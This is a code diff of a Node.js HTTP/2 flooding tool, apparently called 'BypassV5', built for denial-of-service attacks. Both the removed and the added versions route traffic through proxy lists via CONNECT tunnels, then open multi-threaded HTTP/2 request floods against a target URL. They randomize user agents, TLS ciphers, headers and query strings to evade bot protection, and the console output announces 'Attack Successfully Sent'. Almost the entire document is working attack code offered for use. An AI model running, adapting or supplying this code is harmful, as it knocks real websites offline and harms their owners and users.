+    "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
+    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
+    "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
+    "Mozilla/5.0 (Linux; Android 7.0; Nexus 9 Build/NRD90R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36",
+    "Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+    "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
+    "msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
+    "Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)",
+    "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us ; LS670 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1/UCBrowser/8.6.1.262/145/355",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
+    "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
+    "Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
+    "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 920) like Geckoo",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
+    "Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.105 Safari/537.36 Vivaldi/1.0.162.9",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/3.83 (KHTML, like Gecko) Edge/17.12355 Safari/379.91",
+    "Mozilla/5.0 (X11) AppleWebKit/65.61 (KHTML, like Gecko) Firefox/57.0 Safari/421.64",
+    "Mozilla/4.0 (Macintosh) AppleWebKit/9.90 (KHTML, like Gecko) Chrome/73.0.1770.62 Safari/171.77",
+    "Mozilla/4.0 (X11) AppleWebKit/30.34 (KHTML, like Gecko) Edge/14.14389 Safari/363.51",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
+    "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
+    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
+    "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "WebZIP/3.5 (http://www.spidersoft.com)",
+    "Mozilla/4.8 [en] (Windows NT 5.1; U)",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
+    "Mozilla/5.0 (Android; Mobile; rv:35.0) Gecko/35.0 Firefox/35.0",
+    "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
+    "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.02",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
+    "Opera/9.80 (Android; Opera Mini/7.5.33361/31.1543; U; en) Presto/2.8.119 Version/11.1010",
+    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
+    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+    "Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310b) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36",
+    "portalmmm/2.0 N410i(c20;TB)",
+    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
+    "Download Demon/3.5.0.11",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
+    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
+    "Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
+    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
+    "LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
+    "Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
+    "Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT",
+    "Mozilla/5.0 (iPad; U; CPU iPad OS 5_0_1 like Mac OS X; en-us) AppleWebKit/535.1+ (KHTML like Gecko) Version/7.2.0.0 Safari/6533.18.5",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.31 (KHTML like Gecko) Chrome/26.0.1410.63 Safari/537.31",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; da-dk) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3",
+    "CSSCheck/1.2.2",
+    "Mozilla/5.0 (Linux; webOS/2.2.4; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) webOSBrowser/221.56 Safari/534.6 Pre/3.0",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) Sprint:PPC6800",
+    "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
+    "Mozilla/5.0 (Linux; Android 4.1.2; SHV-E250S Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36",
+    "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
+    "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+ ];
+
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+ var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
+ var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+ var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
+ var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
+ var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
+ var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
+ var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
-
- const MAX_RAM_PERCENTAGE = 80;
-const RESTART_DELAY = 1000;
-
- if (cluster.isMaster) {
-  console.clear()
-  console.log(`Attack Successfully Sent`.brightBlue)
-  console.log(`--------------------------------------------`.gray)
-  console.log(` - Target    ◉ `.brightYellow + process.argv[2])
-  console.log(` - Time      ◉ `.brightYellow + process.argv[3])
-  console.log(` - Rate      ◉ `.brightYellow + process.argv[4])
-  console.log(` - Thread    ◉ `.brightYellow + process.argv[5])
-  console.log(` - Owen      : `.brightYellow + "Ngzz Dat")
-  console.log(`--------------------------------------------`.gray)
-  console.log(`BypassV5 By @Ngzz Dat`.brightCyan)
-    const restartScript = () => {
-        for (const id in cluster.workers) {
-            cluster.workers[id].kill();
+ 
+      if (cluster.isMaster) {
+        for (let counter = 1; counter <= args.threads; counter++) {
+          cluster.fork();
         }
-
-        setTimeout(() => {
-            for (let counter = 1; counter <= args.threads; counter++) {
-                cluster.fork();
-            }
-        }, RESTART_DELAY);
-    };
-
-    const handleRAMUsage = () => {
-        const totalRAM = os.totalmem();
-        const usedRAM = totalRAM - os.freemem();
-        const ramPercentage = (usedRAM / totalRAM) * 100;
-
-        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-           ramPercentage.toFixed(2);
-            restartScript();
-        }
-    };
-	setInterval(handleRAMUsage, 5000);
-	
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
-} else {setInterval(runFlooder) }
-
-
+      } else {
+        setInterval(runFlooder);
+      };
+ 
  class NetSocket {
      constructor(){}
-
+ 
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
+ 
      const connection = net.connect({
-        host: options.host,
-        port: options.port,
-    });
-
-    connection.setTimeout(options.timeout * 600000);
-    connection.setKeepAlive(true, 600000);
-    connection.setNoDelay(true)
-    connection.on("connect", () => {
-       connection.write(buffer);
-   });
-
-   connection.on("data", chunk => {
-       const response = chunk.toString("utf-8");
-       const isAlive = response.includes("HTTP/1.1 200");
-       if (isAlive === false) {
-           connection.destroy();
-           return callback(undefined, "error: invalid response from proxy server");
-       }
-       return callback(connection, undefined);
-   });
-
-   connection.on("timeout", () => {
-       connection.destroy();
-       return callback(undefined, "error: timeout exceeded");
-   });
-
-}
-}
-function getRandomInt(min, max) {
-  return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
+         host: options.host,
+         port: options.port
+     });
+ 
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
+ 
+     connection.on("connect", () => {
+         connection.write(buffer);
+     });
+ 
+     connection.on("data", chunk => {
+         const response = chunk.toString("utf-8");
+         const isAlive = response.includes("HTTP/1.1 200");
+         if (isAlive === false) {
+             connection.destroy();
+             return callback(undefined, "error: invalid response from proxy server");
+         }
+         return callback(connection, undefined);
+     });
+ 
+     connection.on("timeout", () => {
+         connection.destroy();
+         return callback(undefined, "error: timeout exceeded");
+     });
+ 
+     connection.on("error", error => {
+         connection.destroy();
+         return callback(undefined, "error: " + error);
+     });
+ }
+ }
 
  const Socker = new NetSocket();
+ headers[":method"] = "GET";
+ headers[":authority"] = parsedTarget.host;
+ headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+ headers[":scheme"] = "https";
+ headers["x-forwarded-proto"] = "https";
+ headers["accept-language"] = lang;
+ headers["accept-encoding"] = encoding;
+ headers["cache-control"] = control;
+ headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+ headers["sec-ch-ua-mobile"] = "?0";
+ headers["sec-ch-ua-platform"] = "Windows";
+ headers["upgrade-insecure-requests"] = "1";
+ headers["accept"] = accept;
+ headers["user-agent"] = randstr(15);
+ headers["sec-fetch-dest"] = "document";
+ headers["sec-fetch-mode"] = "navigate";
+ headers["sec-fetch-site"] = "none";
+ headers["TE"] = "trailers";
+ headers["sec-fetch-user"] = "?1";
+ headers["x-requested-with"] = "XMLHttpRequest";
+ 
+ function runFlooder() {
+     const proxyAddr = randomElement(proxies);
+     const parsedProxy = proxyAddr.split(":"); 
+         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+         headers["origin"] = "https://" + parsedTarget.host;
 
- function readLines(filePath) {
-     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+     const proxyOptions = {
+         host: parsedProxy[0],
+         port: ~~parsedProxy[1],
+         address: parsedTarget.host + ":443",
+         timeout: 100,
+     };
+
+     Socker.HTTP(proxyOptions, (connection, error) => {
+         if (error) return
+ 
+         connection.setKeepAlive(true, 600000);
+
+         const tlsOptions = {
+            host: parsedTarget.host,
+            port: 443,
+            secure: true,
+            ALPNProtocols: ['h2'],
+            sigals: siga,
+            socket: connection,
+            ciphers: tls.getCiphers().join(":") + cipper,
+            ecdhCurve: "prime256v1:X25519",
+            host: parsedTarget.host,
+            rejectUnauthorized: false,
+            servername: parsedTarget.host,
+            secureProtocol: "TLS_method",
+        };
+
+         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+
+         tlsConn.setKeepAlive(true, 60000);
+
+         const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         });
+ 
+         client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          });
+ 
+         client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         });
+ 
+         client.on("close", () => {
+             client.destroy();
+             connection.destroy();
+             return
+         });
+     }),function (error, response, body) {
+		};
  }
- function getRandomValue(arr) {
-    const randomIndex = Math.floor(Math.random() * arr.length);
-    return arr[randomIndex];
-  }
-  function randstra(length) {
-const characters = "0123456789";
-let result = "";
-const charactersLength = characters.length;
-for (let i = 0; i < length; i++) {
-result += characters.charAt(Math.floor(Math.random() * charactersLength));
-}
-return result;
-}
-
- function randomIntn(min, max) {
-  return Math.floor(Math.random() * (max - min + 1)) + min;
-}
- function randomElement(elements) {
-     return elements[randomIntn(0, elements.length)];
- }
- function randstrs(length) {
-    const characters = "0123456789";
-    const charactersLength = characters.length;
-    const randomBytes = crypto.randomBytes(length);
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        const randomIndex = randomBytes[i] % charactersLength;
-        result += characters.charAt(randomIndex);
-    }
-    return result;
-}
-const randstrsValue = randstrs(10);
-  function runFlooder() {
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
-    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
-    const nm = [
-      "110.0.0.0",
-      "111.0.0.0",
-      "112.0.0.0",
-      "113.0.0.0",
-      "114.0.0.0",
-      "115.0.0.0",
-      "116.0.0.0",
-      "117.0.0.0",
-      "118.0.0.0",
-      "119.0.0.0",
-      ];
-      const nmx = [
-      "120.0",
-      "119.0",
-      "118.0",
-      "117.0",
-      "116.0",
-      "115.0",
-      "114.0",
-      "113.0",
-      "112.0",
-      "111.0",
-      ];
-      const nmx1 = [
-      "105.0.0.0",
-      "104.0.0.0",
-      "103.0.0.0",
-      "102.0.0.0",
-      "101.0.0.0",
-      "100.0.0.0",
-      "99.0.0.0",
-      "98.0.0.0",
-      "97.0.0.0",
-      ];
-      const sysos = [
-      "Windows 1.01",
-      "Windows 1.02",
-      "Windows 1.03",
-      "Windows 1.04",
-      "Windows 2.01",
-      "Windows 3.0",
-      "Windows NT 3.1",
-      "Windows NT 3.5",
-      "Windows 95",
-      "Windows 98",
-      "Windows 2006",
-      "Windows NT 4.0",
-      "Windows 95 Edition",
-      "Windows 98 Edition",
-      "Windows Me",
-      "Windows Business",
-      "Windows XP",
-      "Windows 7",
-      "Windows 8",
-      "Windows 10 version 1507",
-      "Windows 10 version 1511",
-      "Windows 10 version 1607",
-      "Windows 10 version 1703",
-      ];
-      const winarch = [
-      "x86-16",
-      "x86-16, IA32",
-      "IA-32",
-      "IA-32, Alpha, MIPS",
-      "IA-32, Alpha, MIPS, PowerPC",
-      "Itanium",
-      "x86_64",
-      "IA-32, x86-64",
-      "IA-32, x86-64, ARM64",
-      "x86-64, ARM64",
-      "ARMv4, MIPS, SH-3",
-      "ARMv4",
-      "ARMv5",
-      "ARMv7",
-      "IA-32, x86-64, Itanium",
-      "IA-32, x86-64, Itanium",
-      "x86-64, Itanium",
-      ];
-      const winch = [
-      "2012 R2",
-      "2019 R2",
-      "2012 R2 Datacenter",
-      "Server Blue",
-      "Longhorn Server",
-      "Whistler Server",
-      "Shell Release",
-      "Daytona",
-      "Razzle",
-      "HPC 2008",
-      ];
-
-       function superUltraMegaStrongRandom(max) {
-            let seed1 = crypto.randomBytes(32).toString('hex'); // 32 byte entropy cực mạnh
-            let seed2 = crypto.randomBytes(32).toString('hex');
-
-            let combinedSeed = seed1 + seed2;
-
-            let hash1 = crypto.createHash('sha512').update(combinedSeed).digest('hex');
-            let hash2 = crypto.createHash('sha512').update(hash1).digest('hex');
-            let hash3 = crypto.createHash('sha512').update(hash2).digest('hex');
-
-            let finalSeed = BigInt("0x" + hash3.slice(0, 32)); // Chuyển sang BigInt để đảm bảo max range
-
-            return Number(finalSeed % BigInt(max)); // Chuyển về số thường, đảm bảo trong phạm vi max
-       }
-
-       var nm1 = nm[superUltraMegaStrongRandom(nm.length)];
-       var nm2 = sysos[superUltraMegaStrongRandom(sysos.length)];
-       var nm3 = winarch[superUltraMegaStrongRandom(winarch.length)];
-       var nm4 = nmx[superUltraMegaStrongRandom(nmx.length)];
-       var nm5 = winch[superUltraMegaStrongRandom(winch.length)];
-       var nm6 = nmx1[superUltraMegaStrongRandom(nmx1.length)];
-        const rd = [
-          "221988",
-          "1287172",
-          "87238723",
-          "8737283",
-          "8238232",
-          "63535464",
-          "121212",
-        ];
-        var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
-  encoding_header = [
-    'gzip, deflate, br', 
-    'deflate, gzip', 
-    'gzip, identity', 
-    'gzip, compress, br', 
-    'identity, gzip, deflate', 
-    'gzip, deflate, zstd', 
-    'br, zstd, gzip', 
-    'gzip, deflate, br, lzma', 
-    'deflate, br, zstd, xpress', 
-    'gzip, deflate, xz', 
-    'gzip, zstd, snappy', 
-    'identity, *;q=0', 
-    , 'gzip, identity'
-    , 'deflate, gzip'
-    , 'compress, gzip', 
-    '*',
-  ];
-  function randstrr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-	}
-    function randstr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-	}
-  function generateRandomString(minLength, maxLength) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
- const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
- const randomStringArray = Array.from({ length }, () => {
-   const randomIndex = Math.floor(Math.random() * characters.length);
-   return characters[randomIndex];
- });
-
- return randomStringArray.join('');
-}
- const val = { 'NEl': JSON.stringify({
-			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
-			"include_subdomains": Math.random() < 0.5 ? true : false}),
-            }
-
-     const rateHeaders = [
-        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
-        {"Access-Control-Request-Method": "GET"},
-        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
-        { "origin": "https://" + parsedTarget.host},
-        { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
-        { "data-return" :"false"},
-        {"X-Forwarded-For" : parsedProxy[0]},
-        {"NEL" : val},
-        {"dnt" : "1" },
-        { "A-IM": "Feed" },
-        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-       {'Delta-Base' : '12340001'},
-       {"te": "trailers"},
-       {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
-];
-let headers = {
-  ":authority": parsedTarget.host,
-  ":scheme": "https",
-  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
-  ":method": "GET",
-  "pragma" : "no-cache",
-  "upgrade-insecure-requests" : "1",
-  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
-  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
-  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
-  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
-  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-  "user-agent" :  "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
-}
- const proxyOptions = {
-     host: parsedProxy[0],
-     port: ~~parsedProxy[1],
-     address: parsedTarget.host + ":443",
-     timeout: 10
- };
- Socker.HTTP(proxyOptions, (connection, error) => {
-    if (error) return
-
-    connection.setKeepAlive(true, 600000);
-    connection.setNoDelay(true)
-
-    const settings = {
-       enablePush: false,
-       initialWindowSize: 15564991,
-   };
-
-
-
-    const tlsOptions = {
-       port: parsedPort,
-       secure: true,
-       ALPNProtocols: ["h2"],
-       ciphers: cipper,
-       sigalgs: sigalgs,
-       requestCert: true,
-       socket: connection,
-       ecdhCurve: ecdhCurve,
-       honorCipherOrder: false,
-       rejectUnauthorized: false,
-       secureOptions: secureOptions,
-       secureContext :secureContext,
-       host : parsedTarget.host,
-       servername: parsedTarget.host,
-       secureProtocol: secureProtocol
-   };
-    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
-
-    tlsConn.allowHalfOpen = true;
-    tlsConn.setNoDelay(true);
-    tlsConn.setKeepAlive(true, 600000);
-    tlsConn.setMaxListeners(0);
-
-    const client = http2.connect(parsedTarget.href, {
-      settings: {
-     
-        headerTableSize: 65536,
-        maxHeaderListSize : 32768,
-        initialWindowSize: 15564991,
-        maxFrameSize : 16384,
-    },
-});
-createConnection: () => tlsConn,
-client.settings({
-  headerTableSize: 65536,
-  maxHeaderListSize : 32768,
-  initialWindowSize: 15564991,
-  maxFrameSize : 16384,
-});
-
-
-client.setMaxListeners(0);
-client.settings(settings);
-    client.on("connect", () => {
-       const IntervalAttack = setInterval(() => {
-           for (let i = 0; i < args.Rate; i++) {
-           
-            const dynHeaders = {                 
-              ...headers,    
-              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-              
-              
-            }
-const request = client.request({
-      ...dynHeaders,
-    }, {
-      parent:0,
-      exclusive: true,
-      weight: 220,
-    })
-               .on('response', response => {
-                   request.close();
-                   request.destroy();
-                  
-                  return
-               });
-               request.end(); 
-               
-
-           }
-       }, 300);
-    });
-    client.on("close", () => {
-      client.destroy();
-      tlsConn.destroy();
-      connection.destroy();
-      return
-  });
-  client.on("timeout", () => {
-    client.destroy();
-    connection.destroy();
-    return
-});
-  client.on("error", error => {
-client.destroy();
-connection.destroy();
-return
-});
-});
-}
-const StopScript = () => process.exit(1);
-
-setTimeout(StopScript, args.time * 1000);
-
-process.on('uncaughtException', error => {});
-process.on('unhandledRejection', error => {});
-
+ console.log('SENT THÀNH CÔNG!'.white);
+ const KillScript = () => process.exit(1);
+ setTimeout(KillScript, args.time * 1000);
